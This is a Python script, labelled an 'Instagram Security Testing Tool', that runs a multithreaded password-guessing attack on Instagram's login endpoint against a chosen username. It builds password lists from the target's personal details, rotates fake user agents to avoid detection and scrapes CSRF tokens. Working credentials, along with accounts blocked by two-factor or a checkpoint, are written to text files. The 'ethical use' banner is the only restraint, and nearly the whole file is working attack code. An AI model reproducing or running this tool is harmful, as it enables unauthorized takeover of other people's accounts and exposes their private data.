# InstagramSecurityTestingTool.py
# Author: Sayed Sayedy

from __future__ import absolute_import, print_function
import itertools
import requests
import sys
import threading
import time
import os
import re
from datetime import datetime
from six.moves import input
from utils.password_generator import generate_passwords, get_personal_info, save_passwords
from utils.user_check import user_exists
from queue import Queue
import logging
import random
from fake_useragent import UserAgent

# Disable .pyc file generation
sys.dont_write_bytecode = True

# Setup logging
logging.basicConfig(filename='/dev/null', level=logging.DEBUG, format='%(asctime)s %(levelname)s %(message)s')

CheckVersion = str(sys.version)
ua = UserAgent()

print('''
\033[32m    
\033[38m***\033[31mInstagram Security Testing Tool\033[38m***
\033[33m*\033[32mDeveloper: Sayed Sayedy \033[33m         *
\033[37m*\033[32mFor Ethical Use Only\033[37m             *
\033[35m***********************************
''')
print('''\033[31mNotice: Please ensure you have proper authorization
before using this tool.\033[32m.''')

class PasswordAttack(object):
    def __init__(self):
        self.clear_console()
        self.user = self.get_username()
        self.Combo = self.get_password_list()
        self.queue = Queue()
        self.populate_queue()
        self.run_threads()

    def clear_console(self):
        command = 'clear' if os.name != 'nt' else 'cls'
        os.system(command)

    def get_username(self):
        while True:
            user = input('Username: ')
            if user_exists(user):
                return user
            else:
                print(f'Username {user} does not exist. Please try again.')

    def get_password_list(self):
        use_generated = input('Generate new passwords? (yes/no): ').lower() == 'yes'
        Combo = 'passwords.txt' if not use_generated else input('Password List: ')
        if use_generated:
            personal_info = get_personal_info()
            generate_passwords('passwords.txt', personal_info)
        return 'passwords.txt'

    def populate_queue(self):
        with open(self.Combo, 'r') as x:
            for combo in x.read().splitlines():
                password = combo.split(':')[0]
                self.queue.put(password)

    def run_threads(self):
        threads = []
        for _ in range(10):  # Adjust the number of threads as needed
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    def worker(self):
        while not self.queue.empty():
            password = self.queue.get()
            self.try_login(self.user, password)
            self.queue.task_done()

    def try_login(self, user, pwd):
        try:
            login_url = 'https://www.instagram.com/accounts/login/ajax/'
            timestamp = int(datetime.now().timestamp())
            payload = {
                'username': user,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{pwd}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }

            with requests.Session() as s:
                r = s.get('https://www.instagram.com/accounts/login/')
                csrf_token = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
                headers = {
                    "User-Agent": ua.random,
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://www.instagram.com/accounts/login/",
                    "x-csrftoken": csrf_token
                }
                r = s.post(login_url, data=payload, headers=headers)
                logging.info(f'Tried {user}:{pwd}')
                print(f'{user}:{pwd}\n----------------------------')

                if 'authenticated": true' in r.text:
                    print(f'{user}:{pwd} --> Login successful')
                    with open('success.txt', 'a') as f:
                        f.write(f'{user}:{pwd}\n')
                elif 'two_factor_required' in r.text:
                    print(f'{user}:{pwd} --> Two-factor authentication required')
                    with open('two_factor.txt', 'a') as f:
                        f.write(f'{user}:{pwd}\n')
                elif 'checkpoint_required' in r.text:
                    print(f'{user}:{pwd} --> Checkpoint required (account locked)')
                    with open('checkpoint.txt', 'a') as f:
                        f.write(f'{user}:{pwd}\n')
                elif 'userId' not in r.text:
                    print(f'{user}:{pwd} --> Username not found')
                else:
                    print(f'{user}:{pwd} --> Login failed')
        except Exception as e:
            logging.error(f'Error trying {user}:{pwd} - {e}')

if __name__ == '__main__':
    PasswordAttack()
